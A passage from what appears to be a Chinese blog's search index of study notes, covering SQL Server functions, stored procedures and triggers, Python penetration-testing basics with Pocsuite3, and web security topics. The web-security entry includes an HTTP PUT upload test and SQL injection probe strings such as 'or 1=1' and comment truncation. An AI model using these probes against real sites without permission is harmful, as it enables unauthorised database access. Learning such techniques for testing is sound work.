)</code></p></li><li><p>substring</p><blockquote><p>从第 starting_position 个位置取 length 个字符</p></blockquote><p><code>substring ( expression , starting_position , length )</code></p></li></ul></li><li><p>字符串比较函数</p><ul><li><p>charindex</p><blockquote><p>指定子串出现的开始位置。</p><p>substring_expression是要找的字符串。</p></blockquote><p><code>charindex ( substring_expression , expression )</code></p></li><li><p>patindex</p><blockquote><p>指定子串出现的开始位置。</p><p>substring_expression是要找的字符串。（两端必须带%号）</p></blockquote><p><code>patindex ( &#39; %substring_expression% &#39;  , expression )</code></p></li></ul><blockquote><p>两者区别：patindex子串中可以使用通配符，可以用于char、varchar、text数据类型。</p></blockquote></li><li><p>字符串操作函数</p><ul><li><p>quotename</p><blockquote><p>用符号括起字符串。</p><p>quote_ character 默认是”[“ 。（用[]括起）</p></blockquote><p><code>quotename ( character_expression , [ , quote_ character ] )</code></p></li><li><p>replicate</p><blockquote><p>重复字符串。</p></blockquote><p><code>replicate ( character_expression , integer_expression )</code></p></li><li><p>reverse</p><blockquote><p>逆转字符串。</p></blockquote><p><code>reverse ( character_expression)</code></p></li><li><p>replace</p><blockquote><p>替换字符串。</p><p>在 1 中找出 2 的子串，并用 3 替换 2 子串返回至 1 中。</p></blockquote><p><code>replace ( string_expression1 ,string_expression2 , string_expression3 )</code></p></li><li><p>space</p><blockquote><p>返回一个空格字符串</p></blockquote><p><code>space ( integer_expression )</code></p></li><li><p>stuff</p><blockquote><p>将字符串中某处的一定长度的字符串替换成目标字符串。</p><p>character_expression2：目标字符串。</p></blockquote><p><code>stuff ( character_expression1 , start_position , length , character_expression2 )</code></p></li></ul></li></ul><h3 id="4-数据类型转化"><a href="#4-数据类型转化" class="headerlink" title="4 数据类型转化"></a>4 数据类型转化</h3><ul><li><p>cast</p><blockquote><p>类型转化。</p></blockquote><p><code>cast ( &lt; expression &gt; as &lt; data_type &gt; [ length ])</code></p></li><li><p>convert</p><blockquote><p><a href="https://www.cnblogs.com/tony312ws/archive/2011/08/04/2127225.html">时间转化</a></p></blockquote></li></ul><h3 id="5-日期-链接"><a href="#5-日期-链接" class="headerlink" title="5 日期    链接"></a>5 日期    <a href="https://www.cnblogs.com/shanzhiming/p/15491641.html#25-yearmonth和day">链接</a></h3><ul><li><p>day</p><blockquote><p>返回日期。</p></blockquote><p><code>day ( &lt; data_expression &gt; )</code></p></li><li><p>month</p><blockquote><p>返回月份。</p></blockquote><p><code>month ( &lt; data_expression &gt; )</code></p></li><li><p>year</p><blockquote><p>返回年。</p></blockquote><p><code>year ( &lt; data_expression &gt; )</code></p></li><li><p>dateadd </p><blockquote><p>日期增加。</p><p>&lt; datepart &gt; ： YY | M | D | WK | HH</p></blockquote><p><code>dateadd ( &lt; datepart &gt; , &lt; number &gt; , &lt; date &gt; )</code></p></li><li><p>datediff</p><blockquote><p>日期差值。</p></blockquote><p><code>datediff ( &lt; datepart &gt; , &lt; date1 &gt; , &lt; date2 &gt; )</code></p></li><li><p>datename</p><blockquote><p>字符串形式返回日期。</p></blockquote><p><code>datename ( &lt; datepart &gt; , &lt; date &gt; )</code></p></li><li><p>datepart</p><blockquote><p>整数形式返回日期。</p></blockquote><p><code>datepart ( &lt; datepart &gt; , &lt; date &gt; )</code></p></li><li><p>getdate</p><blockquote><p>获得当前日期和时间 datetime。</p></blockquote><p><code>getdate()</code></p></li></ul><h3 id="6-自定义"><a href="#6-自定义" class="headerlink" title="6 自定义"></a>6 自定义</h3><blockquote><p>​    <a href="https://zhuanlan.zhihu.com/p/128744140">自定义函数</a></p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> function_name</span><br><span class="line">( [ &#123; <span class="variable">@parameter_name</span> [ <span class="keyword">as</span> ] parameter_data_type  [ <span class="operator">=</span> <span class="keyword">default</span> ] [ readonly ]</span><br><span class="line">[ , ... n ]</span><br><span class="line">]</span><br><span class="line">)</span><br><span class="line"><span class="keyword">returns</span> return_data_type</span><br><span class="line">[ <span class="keyword">with</span> encryption ]</span><br><span class="line">[ <span class="keyword">as</span> ]</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">function_body</span><br><span class="line"><span class="keyword">return</span> scalar_expression</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">-- function_name：函数名，同MySQL内置函数一样，大小写不敏感。</span></span><br><span class="line"><span class="comment">-- @parameter_name:：参数名，必须@ 开头，可以定义多个参数，逗号隔开。</span></span><br><span class="line"><span class="comment">-- parameter_data_type：参数类型。</span></span><br><span class="line"><span class="comment">-- [ = default ] ：默认值。</span></span><br><span class="line"><span class="comment">-- [ readonly ]：函数只读。</span></span><br><span class="line"><span class="comment">-- return_data_type：返回值类型。</span></span><br><span class="line"><span class="comment">-- with encryption：加密。任何人无法查看函数的定义。</span></span><br><span class="line"><span class="comment">-- begin...end：函数体。</span></span><br></pre></td></tr></table></figure><hr><h2 id="八、存储过程"><a href="#八、存储过程" class="headerlink" title="八、存储过程"></a>八、存储过程</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建"><a href="#2-创建" class="headerlink" title="2 创建"></a>2 创建</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> procedure_name [ ; number ]     <span class="comment">-- number：用于区分同名存储过程</span></span><br><span class="line">[ ( <span class="variable">@parameter</span> data_type &#125;</span><br><span class="line">[ <span class="type">varying</span> ] [ <span class="operator">=</span> <span class="keyword">default</span> ] [ output ]           <span class="comment">-- varying output 游标 default 默认值 output 返回参数</span></span><br><span class="line">] &#123; , ... n &#125;</span><br><span class="line">[ <span class="keyword">with</span></span><br><span class="line">    &#123; recompile <span class="operator">|</span> encryption <span class="operator">|</span> recompile , encryption &#125; ]  <span class="comment">-- 每次都重新编译 | 加密</span></span><br><span class="line">[ <span class="keyword">for</span> replication ]   <span class="comment">-- 没用</span></span><br><span class="line"><span class="keyword">as</span> sql_statement [ , ... n ]</span><br></pre></td></tr></table></figure><h3 id="3-查看"><a href="#3-查看" class="headerlink" title="3 查看"></a>3 查看</h3><p><code>exec sp_helptext procedure_name</code></p><h3 id="4-重命名"><a href="#4-重命名" class="headerlink" title="4 重命名"></a>4 重命名</h3><blockquote><p>右键。</p></blockquote><h3 id="5-删除"><a href="#5-删除" class="headerlink" title="5 删除"></a>5 删除</h3><p><code>drop procedure procedure_name</code></p><h3 id="6-执行"><a href="#6-执行" class="headerlink" title="6 执行"></a>6 执行</h3><p><code>exec procedure procedure_name</code></p><h3 id="7-修改"><a href="#7-修改" class="headerlink" title="7 修改"></a>7 修改</h3><p><code>alter procedure procedure_name</code></p><blockquote><p>其他同理create。</p></blockquote><h3 id="8-特殊存储过程"><a href="#8-特殊存储过程" class="headerlink" title="8 特殊存储过程"></a>8 特殊存储过程</h3><p><code>sp_executesql</code>：可以执行sql语句</p><p><code>exec sp_executesql @sql , @para , [ @para1 = @para1 , ... ]</code>（SQL语句，SQL语句参数，参数值等于）</p><hr><h2 id="九、触发器"><a href="#九、触发器" class="headerlink" title="九、触发器"></a>九、触发器</h2><h3 id="1-定义-1"><a href="#1-定义-1" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建-1"><a href="#2-创建-1" class="headerlink" title="2 创建"></a>2 创建</h3><ul><li><p>创建DML触发器</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 数据触发器</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> trigger_name </span><br><span class="line"><span class="keyword">ON</span> table_name</span><br><span class="line">[<span class="keyword">with</span> encryption]  </span><br><span class="line"><span class="keyword">for</span> <span class="operator">|</span> after <span class="operator">|</span> instead <span class="keyword">of</span></span><br><span class="line">[ <span class="keyword">delete</span> <span class="operator">|</span> <span class="keyword">update</span> <span class="operator">|</span> <span class="keyword">insert</span> ] </span><br><span class="line"><span class="keyword">as</span> sql_statement [ ; ]</span><br><span class="line"></span><br><span class="line"># <span class="keyword">rollback</span> transaction 回退数据库</span><br></pre></td></tr></table></figure></li><li><p>创建DDL触发器</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 结构触发器</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">trigger</span> trigger_name</span><br><span class="line"><span class="keyword">on</span> &#123; <span class="keyword">all</span> server <span class="operator">|</span> database &#125;</span><br><span class="line">[ <span class="keyword">with</span> encryption ]</span><br><span class="line">&#123; <span class="keyword">for</span> <span class="operator">|</span> after &#125; &#123; event_type <span class="operator">|</span> event_group &#125; [ , ... n ]</span><br><span class="line"><span class="keyword">as</span> sql_statement [ ; ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &#123; all server | database &#125; ：作用于服务器 | 数据库</span></span><br><span class="line"><span class="comment">-- event_type：create_table , drop_table , alter_table</span></span><br><span class="line"><span class="comment">-- event_group：作用组</span></span><br><span class="line"><span class="comment">-- rollback 回退</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-查看-1"><a href="#3-查看-1" class="headerlink" title="3 查看"></a>3 查看</h3><ul><li>类型：<code>exec sp_helptrigger &#39; table &#39; [ , &#39;type&#39; ]</code></li><li>文本：<code>exec sp_helptext &#39;trigger_name&#39;</code></li></ul><h3 id="4-修改"><a href="#4-修改" class="headerlink" title="4 修改"></a>4 修改</h3><p><code>alter trigger trigger_name</code></p><blockquote><p>同理create。</p></blockquote><h3 id="5-使有效"><a href="#5-使有效" class="headerlink" title="5 使有效"></a>5 使有效</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">disable <span class="operator">|</span> enable <span class="keyword">trigger</span> &#123; [ schema . ] trigger_name [ , ... n ] <span class="operator">|</span> <span class="keyword">all</span> &#125;</span><br><span class="line"><span class="keyword">on</span> object_name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- schema. ：架构</span></span><br><span class="line"><span class="comment">-- object_name：在其上创建DML触发器的对象名称</span></span><br></pre></td></tr></table></figure><h3 id="6-删除"><a href="#6-删除" class="headerlink" title="6 删除"></a>6 删除</h3><p><code>drop trigger trigger_name</code></p><hr><h2 id="十、备份和还原"><a href="#十、备份和还原" class="headerlink" title="十、备份和还原"></a>十、备份和还原</h2><h3 id="1-定义-2"><a href="#1-定义-2" class="headerlink" title="1 定义"></a>1 定义</h3><h3 id="2-创建备份"><a href="#2-创建备份" class="headerlink" title="2 创建备份"></a>2 创建备份</h3><h3 id="3-还原数据库"><a href="#3-还原数据库" class="headerlink" title="3 还原数据库"></a>3 还原数据库</h3>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python渗透</title>
      <link href="/posts/2810fc66.html"/>
      <url>/posts/2810fc66.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python渗透"><a href="#Python渗透" class="headerlink" title="Python渗透"></a>Python渗透</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p></blockquote><hr><h2 id="一、渗透流程"><a href="#一、渗透流程" class="headerlink" title="一、渗透流程"></a>一、渗透流程<img src="/posts/2810fc66/渗透流程.jpg" alt="img"><img src="/posts/2810fc66/推荐网站.jpg" alt="img"><img src="/posts/2810fc66/常见端口问题.jpg" alt="img"></h2><hr><h2 id="二、Python基础补充"><a href="#二、Python基础补充" class="headerlink" title="二、Python基础补充"></a>二、Python基础补充</h2><h3 id="1-命令行操作"><a href="#1-命令行操作" class="headerlink" title="1 命令行操作"></a>1 命令行操作</h3><h4 id="1-1-sys"><a href="#1-1-sys" class="headerlink" title="1.1 sys"></a>1.1 sys</h4><blockquote><p>sys.argv：[0]是本身，[1]是第一个参数，等等。列表存储。</p></blockquote><h4 id="1-2-getopt"><a href="#1-2-getopt" class="headerlink" title="1.2 getopt"></a>1.2 getopt</h4><blockquote><p>自定义带参输入。</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第二个参数是单字符识别，不用隔开空格</span></span><br><span class="line">opts,args = getopt.getopt( sys.argv[<span class="number">1</span>:] , <span class="string">&quot;u:p:&quot;</span> , [<span class="string">&quot;file=&quot;</span>])</span><br><span class="line"><span class="comment">#opts：列表，值为元组，存 ( 选项，选项值 )</span></span><br><span class="line"><span class="comment">#上述选项有：-u -p --file（u: 后面必须有选项值，u 后面没有选项值，带 = 同理后面一定要有参数，否则没有）</span></span><br><span class="line"><span class="comment">#所有选项需要写在参数前面，否则后面的选项会被当做参数传递到 args 中。</span></span><br></pre></td></tr></table></figure><h4 id="1-3-optparse"><a href="#1-3-optparse" class="headerlink" title="1.3 optparse"></a>1.3 optparse</h4><blockquote><p>自动生成帮助文档。</p><p><a href="https://www.cnblogs.com/hardyyy/p/10882711.html">帮助</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加总文档</span></span><br><span class="line">parser = optparse.OptionParser(usage)</span><br><span class="line"><span class="comment"># 添加单个参数</span></span><br><span class="line">parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target user&#x27;</span>,default=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="comment"># dest 是 key，type检测参数格式是否正确，help是帮助信息，default是默认值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解包，带选项以字典存入options中，不带的存入args中</span></span><br><span class="line">options,args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> optparse</span><br><span class="line"></span><br><span class="line">usage = <span class="string">&quot;python %prog -u/--user  -p/--password &quot;</span> <span class="comment"># %prog：file_name</span></span><br><span class="line">parser = optparse.OptionParser(usage)</span><br><span class="line">parser.add_option(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target user&#x27;</span>,default=<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">parser.add_option(<span class="string">&#x27;-p&#x27;</span>,<span class="string">&#x27;--password&#x27;</span>,dest=<span class="string">&#x27;Pad&#x27;</span>,<span class="built_in">type</span>=<span class="string">&#x27;string&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target password&#x27;</span>)</span><br><span class="line">options,args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;options:&quot;</span>,options)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;user:&quot;</span>,options.User)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,options.Pad)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;args&quot;</span>,args)</span><br></pre></td></tr></table></figure><h4 id="1-4-argparse"><a href="#1-4-argparse" class="headerlink" title="1.4 argparse"></a>1.4 argparse</h4><blockquote><p>同理 optparse 但比 optparse 更简单快捷。</p><p><a href="https://www.cnblogs.com/gmpy/p/11796416.html">帮助</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># choices 是选择范围，nargs是参数个数，required是是否必须</span></span><br><span class="line"><span class="comment"># 案例</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-u&#x27;</span>,<span class="string">&#x27;--user&#x27;</span>,dest=<span class="string">&#x27;User&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,default=<span class="string">&#x27;root&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target User&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-s&#x27;</span>,<span class="string">&#x27;--sex&#x27;</span>,dest=<span class="string">&#x27;Sex&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">str</span>,choices=&#123;<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;女&#x27;</span>&#125;,default=<span class="string">&#x27;男&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target Sex&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>,<span class="string">&#x27;--number&#x27;</span>,dest=<span class="string">&#x27;Num&#x27;</span>,nargs=<span class="number">2</span>,required=<span class="literal">True</span>,<span class="built_in">type</span>=<span class="built_in">int</span>,<span class="built_in">help</span>=<span class="string">&#x27;Target Two Numbers&#x27;</span>)</span><br><span class="line">arg = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="comment"># arg.&lt;name&gt;：获得单个参数值</span></span><br></pre></td></tr></table></figure><h3 id="2-网络编程"><a href="#2-网络编程" class="headerlink" title="2 网络编程"></a>2 网络编程</h3><blockquote><p><a href="https://blog.csdn.net/m0_59485658/article/details/128455940">socket与socketserver</a></p></blockquote><h4 id="2-1-IP地址查询"><a href="#2-1-IP地址查询" class="headerlink" title="2.1 IP地址查询"></a>2.1 IP地址查询</h4><blockquote><p><a href="https://github.com/mbcc2006/GeoLiteCity-data">GeoLiteCity.Dat</a></p><p>ip查询：<a href="https://www.ip.cn/">【1】</a> <a href="https://www.ip138.com/">【2】</a> <a href="https://whatismyipaddress.com/">【3】</a> <a href="https://tool.lu/ip">【4】</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 调用程序查询</span></span><br><span class="line"><span class="keyword">import</span> pygeoip</span><br><span class="line">geo = pygeoip.GeoIP( <span class="string">&#x27;GeoLiteCity\GeoLiteCity.dat&#x27;</span> )</span><br><span class="line">geo.record_by_name( <span class="string">&#x27;ip&#x27;</span> )</span><br></pre></td></tr></table></figure><h4 id="2-2-基础函数"><a href="#2-2-基础函数" class="headerlink" title="2.2 基础函数"></a>2.2 基础函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建套接字</span></span><br><span class="line">s = socket( AF_INET , SOCK , IPPROTO )</span><br><span class="line"><span class="comment"># tup是元组：( ip:int , port:str )，TCP/UDP 服务器都绑定</span></span><br><span class="line">s.bind(tup)</span><br><span class="line">s.connect(tup)</span><br><span class="line"><span class="comment"># backlog是排队数，backlog+1 表示允许的最大连接数</span></span><br><span class="line">s.listen(backlog)</span><br><span class="line"><span class="comment"># conn是用于通信的套接字</span></span><br><span class="line">conn , addr = s.accept()    </span><br><span class="line"></span><br><span class="line">s.send( buf , [,flags] )</span><br><span class="line">s.recv( buflen , [,flags] )</span><br><span class="line">s.sendto( <span class="built_in">str</span> , addr )</span><br><span class="line">data,addr = s.recvfrom( buflen , [,flags] )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送全部</span></span><br><span class="line">s.sendall( buf )</span><br><span class="line"><span class="comment"># 发送的数据要编码和解码</span></span><br><span class="line">buf.encode() / decode() </span><br></pre></td></tr></table></figure><h4 id="2-3-其他函数"><a href="#2-3-其他函数" class="headerlink" title="2.3 其他函数"></a>2.3 其他函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取本地 mac 地址</span></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_Mac_Address</span>():</span><br><span class="line">    mac = uuid.UUID(<span class="built_in">int</span> = uuid.getnode()).<span class="built_in">hex</span>[-<span class="number">12</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;:&quot;</span>.join([mac[e:e+<span class="number">2</span>] <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">11</span>,<span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 ip port</span></span><br><span class="line"><span class="comment"># 通过主机名获得 ip</span></span><br><span class="line">ip = gethostbyname( gethostname() )</span><br><span class="line"><span class="comment"># 通过 ip 获得 hostname（返回一个元组）</span></span><br><span class="line">gethostbyaddr( ip )</span><br><span class="line"><span class="comment"># 通过 port 获得 服务名</span></span><br><span class="line">getservbyport( <span class="number">3389</span>,<span class="string">&quot;tcp&quot;</span> )</span><br><span class="line"><span class="comment"># 通过 服务名 获得 port</span></span><br><span class="line">getservbyname( <span class="string">&quot;http&quot;</span> )</span><br></pre></td></tr></table></figure><h4 id="2-4-文件传输实例"><a href="#2-4-文件传输实例" class="headerlink" title="2.4 文件传输实例"></a>2.4 文件传输实例</h4><blockquote><p><a href="https://github.com/Magialeaf/Course/tree/main/Network_Programming">my::案例</a></p><p><a href="https://www.cnblogs.com/jkred369/p/7250136.html">结构体</a></p></blockquote><ul><li><p>服务器</p><blockquote><p>提示界面（cmd）——创建线程类（类中实现发送文件，不需要再 listen 等操作）——发送数据</p></blockquote><ul><li><p>创建线程</p><p><code>socketserver.ThreadingTCPServer(addr,MyServer)</code></p></li><li><p>创建类</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyServer</span>(socketserver.BaseRequestHandler):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>): <span class="comment"># 重写该类功能</span></span><br><span class="line">        self.request <span class="comment"># 为 socket</span></span><br><span class="line">        self.request.close() <span class="comment"># 关闭套接字</span></span><br></pre></td></tr></table></figure></li><li><p>打包</p><p><code>struct.pack(&#39;i&#39;,int).encode(&#39;utf-8&#39;)（i：int类型）</code></p><p><code>json.dumps( dir )：打包（dict类型）</code></p></li></ul></li><li><p>客户端</p><blockquote><p>提示界面（cmd）——connect——接收数据</p></blockquote><ul><li><p>解包</p><p><code>struct.unpack(&#39;i&#39;,int)</code></p><p><code>json.loads(info.decode(&#39;utf-8&#39;))</code></p></li></ul></li></ul><h4 id="2-5-可执行文件转化"><a href="#2-5-可执行文件转化" class="headerlink" title="2.5 可执行文件转化"></a>2.5 可执行文件转化</h4><blockquote><p>pyinstaller打包只可再编译同一操作系统下运行。（不同易报错）</p></blockquote><hr><h2 id="三、Pocsuite3"><a href="#三、Pocsuite3" class="headerlink" title="三、Pocsuite3"></a>三、Pocsuite3</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h3><blockquote><p>Pocsuite3安装：</p><ol><li><code>pip install pocsuite</code></li><li><code>git clone https://github.com/knownsec/pocsuite3.git</code></li><li><code>wget https://github.com/knownsec/pocsuite3/archive/master.zip</code></li></ol><p>必要库安装（在pocsuite3库下使用）：</p><ol><li><code>cd /usr/lib/python3/dist-packages/pocsuite3</code></li><li><code>pip3 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple/</code></li></ol><p>使用：</p><ol><li>在pocsuite3路径下，<code>python3 cli.py &lt;-para&gt;</code></li></ol></blockquote><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><h4 id="2-1-加载远程目标"><a href="#2-1-加载远程目标" class="headerlink" title="2.1 加载远程目标"></a>2.1 加载远程目标</h4><ul><li><p>-u URL [URL…] , —url URL [URL…]</p><blockquote><p>直接指定URL，可以指定多个。</p></blockquote></li><li><p>-f URL_FILE , —file URL_FILE</p><blockquote><p>加载指定文件中的目标。</p></blockquote></li><li><p>-r POC [POC…]</p><blockquote><p>加载POC脚本。</p></blockquote></li><li><p>-c CONFIGFILE Load options from a configuration INI file</p><blockquote><p>调用配置文件。通过配置文件中的配置信息对目标进行POC验证。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web渗透</title>
      <link href="/posts/54924480.html"/>
      <url>/posts/54924480.html</url>
      
        <content type="html"><![CDATA[<h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><blockquote><p><a href=".\5cfe0bd9">text::Web渗透工具</a></p></blockquote><hr><h2 id="〇、Web安全基础"><a href="#〇、Web安全基础" class="headerlink" title="〇、Web安全基础"></a>〇、Web安全基础</h2><h3 id="1-OWAPS"><a href="#1-OWAPS" class="headerlink" title="1 OWAPS"></a>1 OWAPS</h3><blockquote><p>OWAPS（Open Web Application Security Project，开放式Web应用程序安全项目）：提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。</p><p><a href="http://www.owasp.org.cn/">official::OWAPS官网</a></p><p><a href="https://zhuanlan.zhihu.com/p/393635352">Top10</a></p></blockquote><ul><li>漏洞类型（2017年 Top10）<ol><li>注入：数据作为命令注入。</li><li>失效的身份认证：冒充身份。</li><li>敏感感数据泄露：数据泄露。</li><li>XML外部实体（XXE）：全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击。</li><li>失效的访问控制：未身份认证但获得了权限。</li><li>安全配置错误：不安全的配置。</li><li>跨站脚本（XSS）：脚本转义。</li><li>不安全的反序列化：反序列化。</li><li>使用含有已经漏洞的组件：漏洞利用。</li><li>不足的日志记录和监控：日志缺陷。</li></ol></li></ul><h3 id="2-http协议"><a href="#2-http协议" class="headerlink" title="2 http协议"></a>2 http协议</h3><ul><li><p>http协议主要用于传输 html 文本</p><blockquote><p>URL（统一资源定位符）是一种特殊的URI（统一资源标识符）。</p></blockquote></li><li><p>请求头</p><ul><li>Host</li><li>User-Agent</li><li>Accept</li><li>Accept-Language</li><li>Cookie</li><li>Referer </li></ul></li><li><p>响应头</p><ul><li>Location：控制浏览器重定向到哪个页面。</li><li>Server：服务器的 banner 信息。</li><li>Set-Cookie：服务器发送给客户端的 Cookie 设置信息。</li><li>Cache-Control：服务器控制浏览器是否要缓存网页。</li></ul></li><li><p>测试服务器开放的方法：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br></pre></td></tr></table></figure></li><li><p>测试PUT漏洞</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">PUT</span> <span class="string">/input.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br><span class="line">Content-Length=6</span><br><span class="line"></span><br><span class="line">123456</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-Cookie与Session详解"><a href="#3-Cookie与Session详解" class="headerlink" title="3 Cookie与Session详解"></a>3 Cookie与Session详解</h3><ul><li><p>设置 Cookie</p><p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() + &lt;time&gt; )&gt;</code></p></li><li><p>获取 Cookie</p><p><code>&lt;?php print_r( $_COOKIE[ &quot;user&quot; ])</code></p></li><li><p>删除 Cookie</p><p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() - &lt;time&gt; )&gt;</code></p></li><li><p>Cookie解密</p><blockquote><p><a href="https://github.com/Magialeaf/Web/blob/main/Attack/Cookie解密.py">源码</a></p></blockquote></li><li><p>Session</p><blockquote><p>session信息存储在服务器端的数据库或者文件中。客户端请求服务器时都会带上Session信息，这样服务器就可以区分不同的客户端请求。</p><p>组成：Session id，Session file，Session data。</p></blockquote></li></ul><h3 id="4-其他相关知识"><a href="#4-其他相关知识" class="headerlink" title="4 其他相关知识"></a>4 其他相关知识</h3><ul><li><a href=".\Web渗透工具.md">Web渗透工具</a> </li><li><a href="..\..\Main\OS_Security\Kali Linux.md">Kali Linux</a> </li><li><a href="..\Web_Backend\PHP.md">PHP</a> </li></ul><hr><h2 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h2><h3 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1 注入类型"></a>1 注入类型</h3><ul><li><p>数字型注入（判断不正常返回）：</p><ul><li>id=1’：不正常返回</li><li>id=1 and 1=1：正常返回</li><li>id=1 and 1=2：不正常返回</li></ul></li><li><p>字符型注入（判断不正常返回）：</p><ul><li>id=1’：不正常返回</li><li>id=1’ and ‘1’=’1：正常返回</li><li>id=1’ and ‘1’=’2：不正常返回</li></ul><blockquote><p>id=1 or 1=1：表中所有数据将会被显示</p><p>1’# ：会截断后面的 sql 语句</p></blockquote></li><li><p>报错注入：有报错返回的注入</p></li><li><p>盲注：无报错返回的注入</p></li></ul><h3 id="2-MySQL数据库"><a href="#2-MySQL数据库" class="headerlink" title="2 MySQL数据库"></a>2 MySQL数据库</h3><blockquote><p><a href="https://blog.csdn.net/Ajdidfj/article/details/123246593">部分函数</a></p></blockquote><h4 id="2-1-简单使用"><a href="#2-1-简单使用" class="headerlink" title="2.1 简单使用"></a>2.1 简单使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MYSQL——bin</span></span><br><span class="line">mysql -u &lt;user&gt; -p：登入</span><br><span class="line">登入后输入的命令要有 ; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部加：%23（#），（--+）截断后面的命令</span></span><br></pre></td></tr></table></figure><h4 id="2-2-联合注入"><a href="#2-2-联合注入" class="headerlink" title="2.2 联合注入"></a>2.2 联合注入</h4><ul><li><p>系统表</p><blockquote><p>MySQL自带 information_schema 